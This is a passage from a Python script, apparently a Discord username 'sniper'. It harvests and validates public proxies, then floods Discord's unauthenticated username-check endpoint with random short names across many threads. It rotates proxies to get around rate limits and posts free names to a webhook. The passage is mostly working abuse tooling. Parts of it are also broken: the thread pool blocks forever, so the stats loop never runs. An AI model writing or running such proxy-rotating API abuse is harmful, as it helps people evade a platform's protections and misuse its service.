                    if r.status_code != 200 or not r.text:
                        continue
                    for line in filter(None, (l.strip() for l in r.text.splitlines())):
                        if ":" in line and any(c.isdigit() for c in line):
                            proxies.add(line.split()[0])
                except Exception:
                    continue
            lst = list(proxies)
            random.shuffle(lst)
            return lst

        def validate_proxy(proxy: str, test_url="https://httpbin.org/ip", timeout=5) -> bool:
            ps = {"http": "http://" + proxy, "https": "http://" + proxy}
            try:
                r = requests.get(test_url, proxies=ps, timeout=timeout)
                return r.status_code == 200
            except Exception:
                return False

        def filter_working_proxies(proxies: List[str], max_workers=80, keep_limit=400) -> List[str]:
            if not proxies:
                return []
            valid = []
            with concurrent.futures.ThreadPoolExecutor(max_workers=max_workers) as exe:
                futures = {exe.submit(validate_proxy, p): p for p in proxies}
                for fut in concurrent.futures.as_completed(futures):
                    p = futures[fut]
                    try:
                        ok = fut.result()
                    except Exception:
                        ok = False
                    if ok:
                        valid.append(p)
                        if len(valid) >= keep_limit:
                            break
            random.shuffle(valid)
            return valid

        def send_to_webhook(url: Optional[str], username: str, name: Optional[str] = None, avatar: Optional[str] = None, timeout=5) -> None:
            if not url:
                return
            payload = {
                "content": None,
                "username": name or "Notifier",
                "avatar_url": avatar,
                "embeds": [{"title": "Available!", "description": f"**Username:** `{username}`"}],
            }
            try:
                requests.post(url, json=payload, timeout=timeout)
            except Exception:
                pass

        def check_username_once(username: str, proxy: Optional[str] = None, timeout: int = 8) -> Dict[str, Any]:
            url = "https://discord.com/api/v9/unique-username/username-attempt-unauthed"
            headers = {"User-Agent": "Mozilla/5.0", "Content-Type": "application/json", "Accept": "application/json"}
            proxies = None
            if proxy:
                proxies = {"http": "http://" + proxy, "https": "http://" + proxy}
            try:
                r = requests.post(url, headers=headers, json={"username": username}, proxies=proxies, timeout=timeout)
                if r.status_code == 200:
                    j = {}
                    try:
                        j = r.json()
                    except Exception:
                        pass
                    return {"status": "checked", "taken": bool(j.get("taken"))}
                if r.status_code == 400:
                    return {"status": "invalid", "status_code": r.status_code, "body": r.text[:200]}
                return {"status": "http_error", "status_code": r.status_code, "body": r.text[:200]}
            except requests.RequestException as e:
                return {"status": "request_error", "error": str(e)}

        def check_username_reliably(username: str, routes: List[Optional[str]]) -> Dict[str, Any]:
            attempts = 0
            failed_routes = []
            for route in routes:
                attempts += 1
                result = check_username_once(username, proxy=route)
                status = result.get("status")
                if status == "checked":
                    return {
                        "status": "checked",
                        "taken": result.get("taken", False),
                        "proxy": route,
                        "attempts": attempts,
                        "failed_routes": failed_routes,
                    }
                if status == "invalid":
                    return {
                        "status": "invalid",
                        "attempts": attempts,
                        "failed_routes": failed_routes,
                        "proxy": route,
                    }
                failed_routes.append({
                    "proxy": route,
                    "status": status,
                    "detail": result.get("error") or result.get("body") or "",
                })
            return {
                "status": "unknown",
                "attempts": attempts,
                "failed_routes": failed_routes,
            }

        def run_username_sniper(config: Dict[str, Any], block: bool = True, proxy_validate_limit: int = 400) -> Dict[str, Any]:
            threads = config.get("threads")
            if threads is None:
                threads = int(input("threads: "))
            else:
                threads = int(threads)
            threads = max(1, threads)

            check_routes = config.get("check_routes", 3)
            check_routes = max(1, int(check_routes))

            name_len = config.get("name_len")
            if name_len is None:
                name_len = int(input("name length (3, 4 etc...): "))
            else:
                name_len = int(name_len)
            name_len = max(2, name_len)

            include_symbol = config.get("include_symbol")
            if include_symbol is None:
                include_symbol = ask_bool("include symbols? (y/n): ")
            else:
                include_symbol = parse_bool(include_symbol)

            fetch_proxies_flag = config.get("fetch_proxies")
            if fetch_proxies_flag is None:
                fetch_proxies_flag = ask_bool("fetch proxies? (y/n): ")
            else:
                fetch_proxies_flag = parse_bool(fetch_proxies_flag)

            direct_fallback = config.get("direct_fallback", False)
            direct_fallback = parse_bool(direct_fallback)

            webhook = config.get("webhook")
            if webhook is None:
                webhook = input("webhook url (leave blank for none): ").strip()

            webhook_name = config.get("webhook_name")
            if webhook_name is None:
                webhook_name = input("webhook name (leave blank for none): ").strip() or None

            webhook_avatar = config.get("webhook_avatar")
            if webhook_avatar is None:
                webhook_avatar = input("webhook avatar url (leave blank for none): ").strip() or None

            debug = config.get("debug")
            if debug is None:
                debug = ask_bool("debug? (y/n): ")
            else:
                debug = parse_bool(debug)

            config = {
                "threads": threads,
                "check_routes": check_routes,
                "name_len": name_len,
                "include_symbol": include_symbol,
                "fetch_proxies": fetch_proxies_flag,
                "direct_fallback": direct_fallback,
                "webhook": webhook,
                "webhook_name": webhook_name,
                "webhook_avatar": webhook_avatar,
                "debug": debug,
            }

            save_sniper_config(config)

            console.print(
                f"[bold]starting vane sniper[/] threads={threads} check_routes={check_routes} "
                f"name_len={name_len} include_symbol={include_symbol} direct_fallback={direct_fallback}"
            )

            proxy_list: List[str] = []
            if fetch_proxies_flag:
                console.print("fetching proxies...", end="")
                proxy_list = fetch_proxies()
                console.print(f" [green]{len(proxy_list)}[/] fetched")
                console.print("validating proxies (concurrent)...")
                proxy_list = filter_working_proxies(proxy_list, max_workers=min(200, threads * 10), keep_limit=proxy_validate_limit)
                console.print(f" [green]{len(proxy_list)}[/] validated working proxies kept (capped)")
            else:
                console.print("proxy fetching disabled. using direct requests.")

            if not proxy_list:
                console.print("[yellow]no working proxies available :( will attempt direct requests[/]")

            use_direct_routes = not fetch_proxies_flag or direct_fallback or not proxy_list

            proxy_queue = deque(proxy_list)
            proxy_failures: Dict[str, int] = {}
            max_proxy_failures = 3
            stats = {
                "names": 0,
                "attempts": 0,
                "checked": 0,
                "taken": 0,
                "sniped": 0,
                "invalid": 0,
                "unknown": 0,
                "errors": 0,
                "dropped_proxies": 0,
            }
            stop_event = threading.Event()
            lock = threading.Lock()

            def select_routes(limit: int) -> List[Optional[str]]:
                routes: List[Optional[str]] = []
                with lock:
                    if not proxy_queue:
                        return routes
                    for _ in range(min(limit, len(proxy_queue))):
                        proxy = proxy_queue[0]
                        proxy_queue.rotate(-1)
                        if proxy not in routes:
                            routes.append(proxy)
                return routes

            def record_route_failures(failed_routes: List[Dict[str, Any]]) -> None:
                for failed in failed_routes:
                    proxy = failed["proxy"]
                    if not proxy:
                        continue
                    failures = proxy_failures.get(proxy, 0) + 1
                    proxy_failures[proxy] = failures
                    if failures >= max_proxy_failures:
                        try:
                            proxy_queue.remove(proxy)
                        except ValueError:
                            pass
                        proxy_failures.pop(proxy, None)
                        stats["dropped_proxies"] += 1
                        if debug:
                            console.print(f"[yellow]dropping proxy[/] {proxy} after {failures} failures")

            def generate_username(length: int, include_symbol_local: bool = False) -> str:
                characters = string.ascii_lowercase + string.digits
                if include_symbol_local:
                    characters += "_."
                return "".join(random.choices(characters, k=length))

            def worker() -> None:
                nonlocal proxy_queue
                while not stop_event.is_set():
                    username = generate_username(length=name_len, include_symbol_local=include_symbol)
                    routes = select_routes(check_routes)
                    if routes and direct_fallback and None not in routes:
                        routes.append(None)
                    elif not routes and use_direct_routes:
                        routes = [None]
                    elif not routes:
                        with lock:
                            if not proxy_queue:
                                console.print("[yellow]no proxy routes left. stopping.[/yellow]")
                                stop_event.set()
                        continue
                    result = check_username_reliably(username, routes)
                    status = result["status"]
                    with lock:
                        stats["names"] += 1
                        stats["attempts"] += result.get("attempts", 1)
                        record_route_failures(result.get("failed_routes", []))
                        if status == "checked":
                            stats["checked"] += 1
                            proxy = result.get("proxy")
                            if proxy:
                                proxy_failures.pop(proxy, None)
                            if result.get("taken"):
                                stats["taken"] += 1
                                console.print(f"[red]✕ taken[/] - {username}")
                            else:
                                stats["sniped"] += 1
                                console.print(f"[green]✓ sniped[/] - {username}")
                                send_to_webhook(webhook, username, name=webhook_name, avatar=webhook_avatar)
                        elif status == "invalid":
                            stats["invalid"] += 1
                            if debug:
                                console.print(f"[yellow]invalid username[/] - {username}")
                        elif status == "unknown":
                            stats["unknown"] += 1
                            stats["errors"] += 1
                            if debug:
                                last_failure = (result.get("failed_routes") or [{}])[-1]
                                detail = last_failure.get("detail") or last_failure.get("status") or status
                                console.print(f"[red]unknown[/] {username}: {detail}")
                        else:
                            stats["errors"] += 1
                            if debug:
                                detail = result.get("error") or result.get("status_code") or status
                                console.print(f"[red]request error[/] {detail}")

            threads_list: List[threading.Thread] = []
            with ThreadPoolExecutor(max_workers=max(1, threads)) as executor:
                futures = [executor.submit(worker) for _ in range(max(1, threads))]
                for f in futures:
                    f.result()

            if not block:
                return {"threads": threads_list, "stop_event": stop_event, "stats": stats, "proxy_queue": proxy_queue}

            try:
                while True:
                    time.sleep(5)
                    with lock:
                        checked_rate = (stats["checked"] / stats["names"] * 100) if stats["names"] else 0
                        console.print(
                            f"names: {stats['names']}  attempts: {stats['attempts']}  checked: {stats['checked']}  "
                            f"checked_rate: {checked_rate:.1f}%  taken: {stats['taken']}  unknown: {stats['unknown']}  "
                            f"sniped: {stats['sniped']}     "
                            f"errors: {stats['errors']}  proxies: {len(proxy_queue)}  dropped: {stats['dropped_proxies']}"
                        )
            except KeyboardInterrupt:
                console.print("stopping sniper...")
                stop_event.set()
                for t in threads_list:
                    t.join(timeout=1)
                console.print("stopped.")
            return {"threads": threads_list, "stop_event": stop_event, "stats": stats, "proxy_queue": proxy_queue}

        config = load_sniper_config()
        run_username_sniper(config)
    else:
        print("quitting")


start()
